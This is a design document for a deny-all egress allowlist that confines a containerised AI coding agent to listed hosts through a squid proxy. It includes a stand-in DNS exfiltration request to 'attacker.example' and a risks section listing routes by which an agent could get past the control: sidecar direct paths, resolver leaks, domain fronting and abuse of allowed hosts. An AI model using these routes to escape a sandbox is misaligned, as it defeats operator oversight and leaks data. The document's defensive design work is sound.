## Context

Issue #167 asks for a deny-all egress allowlist on top of `--egress-lock`
(#75, #101). The lock already provides everything an allowlist needs except the
list: an `--internal` agent network whose only way out is a per-session squid
sidecar, a saved access log and `.meta` file, and fail-closed startup and
teardown. Its squid config ends in `http_access allow all`
(`gen_egress_squid_conf` in `run.sh`), and the egress-lock change lists "a host
or repo allowlist, in any form" as a non-goal.

The teams that use the lock mostly have a hard requirement: all traffic goes
to the LLM proxy and to known on-prem hosts. This change delivers that core:
one flag, one host-side file, deny everything else. Conveniences are
follow-ups (D9).

Prior work: #100 (`2bfc71f`) proposed a per-repo list approved by hash, and the
first #101 draft put a name-only deny before every `dst` ACL; both inform D5
and D6. Egress-lock design D3 rejected a deny-all list as a default; this is a
second opt-in for the teams that need it.

Constraints carried over: no new capabilities in the agent container
(`CapBnd` stays `0xc5`), bash 3.2 on macOS, and an env var that names a
host-side file (`CLAUDE_DOCKER_GH_POLICY`, `CLAUDE_DOCKER_API_CA`) as the
established knob.

## Goals / Non-Goals

**Goals:**

- Under `--egress-allowlist`, a session reaches only the model endpoint and
  the hosts in the allowlist file, by any client (except routes the user adds
  in a sidecar policy snippet, see Risks), and its own list can't be changed
  from inside the session.
- Names off the effective allowlist aren't resolved, by squid or by the engine's DNS.
- The saved evidence shows which rules ran and which file they came from.
- Sessions without the flag are unchanged, down to the generated squid
  config and the `.meta` keys.

**Non-Goals:**

- The follow-ups in D9; a per-repository list; subscription sessions; TLS
  interception; per-path rules; non-HTTP protocols.
- Closing exfiltration through an allowed host, or a list widened for a
  session that starts after a write to the file (see Risks).

## Decisions

### D1. A separate flag that requires `--egress-lock` (option B)

| Option | Verdict |
| --- | --- |
| **A.** Extend `--egress-lock`: it reads a list when one is configured | Rejected. A file appearing on disk would change what an existing command line does. |
| **B.** A separate flag that requires `--egress-lock` | **Chosen.** `--egress-lock` keeps its meaning and stays the base layer. |
| **C.** A separate flag without `--egress-lock`, for subscription users | Rejected for now. Those sessions need provider hosts the lock refuses by design. |

### D2. The file is the only source

The **effective allowlist** is a set of names: the `ANTHROPIC_BASE_URL`
host, `claude-docker-api-proxy` under `--api`, and the hosts and suffixes in
**one allowlist file**. Every name on it is reachable on 80 and 443. A few
also get one extra port: the endpoint on its own port, `claude-docker-api-proxy`
on 8080, the `--glab` host on its own port (as the composition requirement
allows), and each file entry written with `:port`. Nothing else adds a host:
no flag, no credential option, no fallback path.

The file is `FILE` from `--egress-allowlist=FILE`, else the path in
`CLAUDE_DOCKER_EGRESS_ALLOWLIST`. With neither, `run.sh` refuses to start:
the file is the only source, so a missing one is a mistake, not an empty
list. (An empty file is allowed and gives the endpoint only.) The env var fits
`op run --env-file team.env`, while the command line still says
`--egress-allowlist`. Without the flag, the env var is not read.

`run.sh` expands a leading `~/` in either path, because bash leaves `~` after
`=` unexpanded. `--egress-allowlist FILE` with a space makes `FILE` a
workspace argument; when the flag has no value and a workspace argument is a
regular file, the error suggests `--egress-allowlist=FILE`.

There is no fixed fallback path such as `$XDG_CONFIG_HOME/...`: a file that
applies silently is option A's problem again, and a session run on `$HOME`
could write it.

### D3. Credential flags add nothing; sidecar flags need their hosts listed

Credential flags (`--gh`, `--gh-direct`, `--glab`, `--glab-direct`, `--tfe`,
`--az`, `--aws`, `--registry`) add no hosts. The user lists every host a
session may reach; a flag whose hosts aren't listed fails, and the denied
summary names them.

`--gh` and `--glab` need one more rule when their auth-proxy sidecar is
active, that is, when a token was found (without one there is no sidecar, and
their traffic goes through squid like any other). The sidecar is on the
agent's internal network and the agent's `/etc/hosts` maps the hosts it serves
to it, so a client that ignores the proxy env reaches the sidecar directly,
and the sidecar forwards to its upstream regardless of squid's list. Under
`--egress-allowlist`, `run.sh` therefore refuses to start:

- with `--gh`, unless `github.com`, `api.github.com` and `uploads.github.com`
  are each covered by an entry;
- with `--glab`, unless the proxied GitLab host is covered by an entry;
- when `CLAUDE_DOCKER_GH_UPSTREAM` or `CLAUDE_DOCKER_GLAB_UPSTREAM` is set,
  because they point the sidecar at an arbitrary upstream that no entry
  describes.

An exact entry or a covering `.suffix`, with or without a port, counts. A
`.suffix` covers the domain itself and every subdomain, as squid's
`dstdomain` does and as the existing provider check (`run.sh:439`) does:
`.github.com` covers `github.com` and `api.github.com`; `.github.io` and
`notgithub.com` cover neither. The checks use the same condition as
`start_auth_sidecar` (`run.sh:1605`, `1609`): `WITH_GH=1` and a non-empty
`GH_HOST_TOKEN`, and `WITH_GLAB=1` and a non-empty `GLAB_HOST_TOKEN`. The flag
matters, because `GH_HOST_TOKEN` is also set without `--gh` whenever
`GH_TOKEN` is exported; the `*_SIDECAR_ACTIVE` flags themselves are only set
later. With the hosts listed, the direct path matches
the policy. The upstream checks run in `validate_opts`. The host checks need
to know whether a sidecar will run and, for `--glab`, the proxied host, which
`discover_tokens` sets from `GITLAB_HOST` or glab's own discovery; so they run
after discovery and before `create_egress_networks`, still before any
container resource exists.

`CLAUDE_DOCKER_GH_POLICY` and `CLAUDE_DOCKER_GLAB_POLICY` snippets can add
routes inside the sidecar. Under `--egress-allowlist` their files get the same
treatment as the allowlist file (D4 steps 1-3: resolve, containment check,
one in-memory read, control-byte check), and `stage_gh_proxy_site` /
`stage_glab_proxy_site` write those bytes into the stage instead of copying
the original path, so the file can't change between the check and its use; what they contain is the user's choice, and Risks
names them. The `--api` sidecar needs no check: it only forwards to the
endpoint.

### D4. Reading the file safely

All checks except the sidecar host checks (D3) run in `validate_opts`,
before runtime detection, so they are testable without an engine.

1. **Resolve the file itself.** Follow the path's own symlink chain with a
   `readlink` loop of at most 40 links (relative targets against the link's
   directory; bash 3.2-safe, no `readlink -f` or `realpath`; more links is
   refused as a loop), then `cd -P` into the final directory, take `pwd -P`
   and append the basename. The result is the **resolved path**.
2. **Refuse a file inside a workspace.** Resolve each workspace with
   `cd -P … && pwd -P` (today's workspace code uses plain `pwd`, which keeps
   symlinks, so it can't be reused) and refuse the file if its resolved path
   is inside any of them, read-only or not, comparing on a `/` boundary.
3. **Read once, in memory.** The stage directory and its EXIT trap don't
   exist yet when `validate_opts` runs, so there is no disk copy. `run.sh`
   reads the resolved file once with `content=$(cat -- "$f"; printf x)` and
   strips the `x`, which keeps trailing newlines. Under `LC_ALL=C`, the
   length of `content` must equal `wc -c` of the file, a best-effort guard
   against NUL bytes (which bash drops): `wc` opens the file again, so it
   doesn't prove the file was unchanged, but the hashed and parsed bytes are
   the same either way. A mismatch is refused. Control bytes other than CR, LF and TAB are refused too. The hash
   is `printf '%s' "$content"` piped to `sha256sum`, else `shasum -a 256`;
   with neither tool, `--egress-allowlist` refuses to start. Parsing reads the
   same variable, including a last line without a newline
   (`while IFS= read -r line || [ -n "$line" ]`). The resolved path and hash
   are kept in shell variables for the evidence (D8).

This keeps the agent from changing the list of its own session. It can't
stop a session that could write the file, or an env file that sets
`CLAUDE_DOCKER_EGRESS_ALLOWLIST`, from widening the list of a session that
starts after the write (Risks). Hard links into a workspace aren't detectable by path;
the docs say to keep the file outside every workspace.

### D5. Entry format and validation

```
# comment                     whole-line comments and blank lines are ignored
pypi.org                      exact host           # trailing comments too
.corp.example                 the domain and every subdomain (squid dstdomain)
git.corp.example:8443         host or .suffix with a port
```

A trailing CR is stripped, then everything from the first `#`, then
leading and trailing spaces and tabs; any space, tab or CR left inside the
entry makes it invalid. The entry is
lowercased before it is checked, so every check is case-insensitive. Every
entry is checked before any container resource exists:

- **Host:** letters, digits, `-` and `.`, at most 253 characters, labels of
  1-63 characters that don't start or end with `-`, no trailing dot. This is
  also the config-injection defence: no whitespace, quote, newline or leading
  `-` reaches `squid.conf`.
- **Not an address:** a host whose last label is all digits, or `0x` plus hex
  digits, is refused. That covers dotted quads and shorthand IPv4 such as
  `167772165` or `10.5`, which squid would treat as an address. IP and CIDR
  entries are a follow-up.
- **`.suffix`:** at least two labels (`.com` is refused). `*.example.com` is
  refused with a hint to write `.example.com`.
- **Port:** 1-65535.
- **Not a provider host:** `anthropic.com`, `claude.ai`, `claude.com` or a
  subdomain of one, so the list can't contradict the lock. The check reuses
  `EGRESS_MODEL_PROVIDERS`, the list the endpoint check already uses.

An invalid entry is fatal, naming the file and line; `run.sh` reports every
invalid line, not only the first.

Duplicates and overlaps are not the user's problem: when it builds the squid
ACLs, `run.sh` drops exact duplicate names and names covered by a listed
`.suffix` from `egress_allowed_names`, because squid drops one of two
overlapping `dstdomain` values with a warning. Port pairs are kept per entry.

### D6. Rule order

Under `--egress-allowlist`:

```
 1. deny manager
 2. deny egress_metadata_names                                   (name)
 3. deny !egress_allowed_names                                    (name only, NEW)
 4. deny egress_metadata_addrs, egress_linklocal, egress_loopback  (dst)
 5. deny egress_model_providers                                   (moved up)
 6. allow the endpoint on its port; claude-docker-api-proxy on 8080;
    the --glab host on its port; each entry with a port on it     (NEW pairs)
 7. deny !egress_ports; deny CONNECT !egress_tls_port
 8. allow egress_allowed_names                                    (NEW)
 9. deny all                                                      (was: allow all)
```

Without `--egress-allowlist`, the generated config is byte-identical to
today's.

- The `--glab` pair is the existing `egress_auth_proxy_glab` /
  `egress_auth_proxy_glab_port`, from the port in the proxied host
  (`GLAB_PROXY_HOST`); with no port there is no pair.
- `egress_allowed_names` (`dstdomain -n`) holds every name on the effective
  allowlist. An entry with a port therefore also reaches its host on 80/443:
  a port adds to 80/443, it doesn't replace them. Per-entry port pairs are
  named `egress_allow_<n>` / `egress_allow_<n>_port`, in file order, like the
  existing `egress_model_endpoint` / `egress_model_port`.
- **Rule 3 is the DNS defence.** A `dst` ACL makes squid resolve the request's
  name, so without rule 3 `CONNECT <secret>.attacker.example:443` would leak
  `<secret>` through squid's resolver even though rule 9 refuses it. With no
  address entries, rule 3 is a plain "not on the list", with no IP-literal
  exception to get wrong; IP-literal requests stop there too. `-n` on every
  `dstdomain` stops reverse lookups of IP literals.
- **Address denies (4) and the provider deny (5) come before every allow**,
  including the port pairs, so no entry re-opens metadata, loopback or a
  provider. Under `--egress-lock` alone, the provider deny stays where it is.
- **Port denies (7) come after the port pairs (6)**, as under the lock today,
  so the endpoint and per-entry ports work while everything else stays on
  80/443 and `CONNECT` 443.

**Private ranges** are reachable only through a name on the effective
allowlist (or an endpoint that is a private IPv4 address). On-prem hosts are
listed by name.

### D7. DNS must be closed

On Docker < 26 the engine's embedded resolver still forwards external names
from an internal network. The lock documents that gap; for the allowlist it
defeats the purpose, so the session checks it before starting.

Right after `create_egress_networks`, before `start_auth_sidecar` and
`start_egress_sidecar`, so a failure never leaves a sidecar running, `run.sh`
runs two short probes from the agent
image, with the agent's user and `--cap-drop`, named
`claude-egress-proxy-<id>-probe-control` and `…-probe-check` so the existing
stopped-only prune (`^claude-egress-proxy-`) covers them, with `--rm`, and
both removed by name in the EXIT trap with
`rm -f <name> >/dev/null 2>&1 || true`, like the trap's other removals (with
`--rm` they are normally gone already, and an unguarded `rm` would stop the
trap under `set -e`):

The probe is a short `node -e` script (Node ships in the image for Claude
Code; `getent` can't tell a timeout from not-found, and there is no `dig`).
It queries `example.org` with `dns.promises.Resolver` against the container's
own resolver, one try, a 3-second timeout, and prints the address or the
error code.

1. **Control,** on the outbound network (`claude-egress-out-<id>`): it must
   return an address. Otherwise DNS is unavailable and the internal result
   would prove nothing, so the session aborts as inconclusive.
2. **Check,** on the internal network: it must return a code showing that the
   resolver answered without an address. Task 0.5 records which code Docker ≥
   26 and rootless podman (netavark, aardvark-dns) return (expected
   `ENOTFOUND` or `EREFUSED`), and only the codes recorded for the session's
   runtime pass. If podman can't be checked, `--egress-allowlist` is
   Docker-only until it is, and the abort message names the runtime. An
   address, `ETIMEOUT`, `ECONNREFUSED`, any other code, or a probe that can't
   run aborts the session. This doesn't depend on timing.

   As implemented: the passing codes are `ENOTFOUND`, `EREFUSED`,
   `ESERVFAIL` and `ENODATA` (`EGRESS_DNS_CLOSED_CODES` in `run.sh`), each an
   answer without an address. `ESERVFAIL` is safe because the control has just
   resolved on the outbound network: a forwarding internal resolver would
   have answered with the address. Podman couldn't be checked, so
   `--egress-allowlist` refuses any runtime but docker before creating a
   resource. The smoke cell (`tests/smoke/egress.sh --allowlist`) logs the
   code Docker returns on every CI run and fails when it isn't in the list,
   or when an unreachable resolver's code is (task 0.5). First CI run, Docker
   28.0.4: `ESERVFAIL` on the internal network, `ECONNREFUSED` against an
   unreachable resolver.

The resolver timeout is inside the script, because macOS has no `timeout`
on the host.

### D8. Evidence

Under `--egress-allowlist`, and only then:

- When the squid config is generated, before the agent starts, `run.sh`
  computes the session's start timestamp, creates the evidence directory
  (`mkdir -p`, mode 700, as `egress_save_log` does), and writes the same file
  that is mounted into squid to `<start>-<id>.conf` there under `umask 077`.
  The EXIT trap removes the stage directory before it saves the log, so the
  stage copy can't be used at teardown. If the directory or the file can't be
  created or written, `run.sh` exits 1 before the proxy starts, naming the
  path, like the other startup steps. At teardown, `egress_save_log` only
  warns and continues: the `.meta` write is guarded like its `mkdir`, and the
  EXIT trap calls `egress_save_log || true`, so under `set -e` a failed write
  can't skip the sidecar and network removals that follow it.
- `.meta` gains `allowlist_file` (the resolved path), `allowlist_sha256` and
  `allowlist_add_hosts` (the `--add-host` entries given to squid, from
  `CLAUDE_DOCKER_ADD_HOSTS` and the sidecars), from globals set at startup.
  The add-host list is built in a local array in `start_egress_sidecar`, so
  it is copied to the global `egress_add_hosts`, initialised to `()` with the
  other egress globals, right after the add-host loop and before the proxy's
  `run -d` and `egress_started`. Every later failure exit then still leaves
  the trap a defined value, read with the `${arr[@]+…}` guard for `set -u`.
  `--add-host` decides where a listed name connects, and isn't in
  `squid.conf`.

The existing `egress proxy blocked:` summary names what to add. Sessions
without the flag keep today's `.meta` keys and get no `.conf`.

### D9. Follow-ups

Each is a small change, taken when teams ask:

1. **Presets** (`preset:npm` as a file entry), with a CI job that fetches
   through each and fails on a denied host.
2. **IP and CIDR entries**, with an anchored IP-literal exception in rule 3
   (`^([0-9]{1,3}\.){3}[0-9]{1,3}$`; unanchored, `1.2.3.4.<secret>.x` would
   pass and be resolved), a `dst` allow, and width limits.
3. **Implied hosts** for credential flags: exact hosts only, never
   `.amazonaws.com` or `.visualstudio.com`.
4. **A multi-tenant suffix guard** refusing `.co.uk`, `.github.io`,
   `.amazonaws.com` and the like as `.suffix` entries.
5. **A startup report** of entries added since the last allowlist session.
   `EGRESS_LOG_DIR` defaults to a directory under `$HOME` (`XDG_STATE_HOME`
   can move it), which a session on `$HOME` can write, so the report must
   refuse or warn when that directory lies inside a workspace.
6. **An allow hint** after the denied summary, naming the file used.
7. **A per-repository file** with host-side hash approval (#100), plus a
   private-range deny for its entries.

### Spec conventions

In the spec scenarios, `$HOME/team.allow` is a readable file outside every
workspace. "Allowed" means the proxy's access log shows the request without
`TCP_DENIED` (for an unreachable on-prem address, a connect attempt);
"refused" means the proxy answers 403 and logs `TCP_DENIED`.

## Risks / Trade-offs

`docs/auth.md` and `docs/security.md` must say what the allowlist won't stop,
so nobody sells it as a DLP control:

- **Data sent through allowed hosts.** The LLM proxy receives every prompt by
  design. A multi-tenant allowed host (GitHub, a package registry, a shared Git
  server) is a channel with a credential the attacker supplies in a prompt.
- **`.suffix` entries for zones others control.** For a listed `.suffix`,
  squid resolves `<anything>.suffix`, so whoever runs that zone sees the label,
  can serve an upload endpoint under it, and can point a name at a private
  address. A `.suffix` is only safe for a zone the organisation controls; never
  list `.co.uk`, `.github.io`, `.amazonaws.com`, `.blob.core.windows.net` or
  similar. The docs say so; a guard is follow-up D9.4.
- **Domain fronting.** squid sees only the `CONNECT` host, not SNI or the inner
  `Host` header.
- **Other host-side knobs.** A session that could write the allowlist file, or
  an env file setting `CLAUDE_DOCKER_EGRESS_ALLOWLIST`, `ANTHROPIC_BASE_URL` or
  `CLAUDE_DOCKER_ADD_HOSTS`, widens any session that starts after the write. Keep them
  outside every workspace and don't run an allowlist session on `$HOME`; a
  changed `allowlist_sha256` between sessions shows it.
- **Sidecar policy snippets** (`CLAUDE_DOCKER_GH_POLICY`,
  `CLAUDE_DOCKER_GLAB_POLICY`) can route the sidecar to hosts outside the list,
  without a squid log entry. Their files must lie outside every workspace (D3);
  their content is the user's responsibility.
- **Friction.** Every host must be listed, including ones tools fetch at
  runtime. The default without the flag stays open.

## Open Questions

1. Whether plain `--egress-lock` sessions should also save `squid.conf`.
2. The base requirement "The network is the boundary" states DNS closure
   unconditionally; only `--egress-allowlist` checks it. Whether to scope that
   sentence is left to the archive of this change (task 5.2).

## Implementation notes

- Tasks 0.1-0.4, 0.6 and 0.7 are permanent cases in
  `tests/egress-proxy/harness.sh`, which runs the real squid in CI (it needs
  Docker); 0.5 is in the `--allowlist` smoke cell. They were written without
  a local engine, so their first CI run is the check.
- `egress_allowed_names` takes one `acl` line per name rather than one long
  line, which could pass squid's config line limit.

## Appendix A. squid 7.6 behaviour checked during review

Review raised two possible changes to plain `--egress-lock` sessions. Both
were checked against the squid 7.6 source
(<https://github.com/squid-cache/squid/tree/SQUID_7_6>; file paths below are
relative to it) and the Alpine 3.24 `squid-7.6-r0` build's configure options,
and both were dropped from this change so that `--egress-lock` stays
unchanged. These are source-reading results from 2026-10-29, not runtime
tests; tasks 0.1-0.5 and 0.7 check the behaviour this design relies on, and
task 0.6 checks the two findings below, for plain HTTP and `CONNECT`.

**An `ANTHROPIC_BASE_URL` host starting with `-`.** The endpoint check
(`run.sh:420`) accepts it, and the host is written as
`acl egress_model_endpoint dstdomain -n <host>`. squid parses every leading
`-` token on an ACL line as an option (`src/acl/Options.cc`), and
`dstdomain` supports only `-n` (`src/acl/DestinationDomain.cc`):

- `-gw.example.eu`, `--gw.example.eu` and any other `-x…` host:
  `unsupported ACL option`, a configuration error. squid doesn't start, and
  the lock aborts before the agent container starts.
- exactly `-n` or `--`: read as an option or the end-of-options marker,
  leaving an empty ACL (`WARNING: empty ACL`). squid starts, but the endpoint
  allow never matches, and the host doesn't resolve.

Every case fails closed, and no real gateway has such a name because DNS
hostnames can't start with `-`. `ANTHROPIC_BASE_URL` is set by the user on
the host. A valid but wrong URL (a lookalike domain, the wrong region's
gateway) is the human error that does misdirect model traffic, and no
syntax check can catch it; the `endpoint=` line in `.meta` is where it shows.

**Control characters in the denied-host summary.** The summary prints field 7
of `TCP_DENIED` lines, and squid's native log writes the URL as is
(`src/log/FormatSquidNative.cc`).

- The request-line parser (`src/http/one/RequestParser.cc`) accepts only URI
  characters, whitespace, RFC 2396 "unwise" characters and, with HTTP
  violations (not disabled in Alpine's build), bytes 0x80–0xFF in the
  request target. ESC and other C0 controls make the request a parse error,
  which is not logged as `TCP_DENIED`. Whitespace is stripped from hosts
  (`uri_whitespace strip`, the default).
- `CONNECT` hosts must be HTTP token characters (`src/anyp/Uri.cc`,
  `parseHost`).
- A plain-HTTP host can carry bytes 0x80–0xFF (`check_hostnames` is off by
  default), and a denied one (for example on port 8080) reaches the summary.
  0x9b is CSI only in terminals using 8-bit C1 controls; UTF-8 terminals show
  an invalid byte.

So an agent can at most garble the summary in a UTF-8 terminal, not inject
escape sequences. Reducing printed hosts to `[A-Za-z0-9.:-]` would remove the
residue; that is a separate fix for `--egress-lock`, not part of this change.
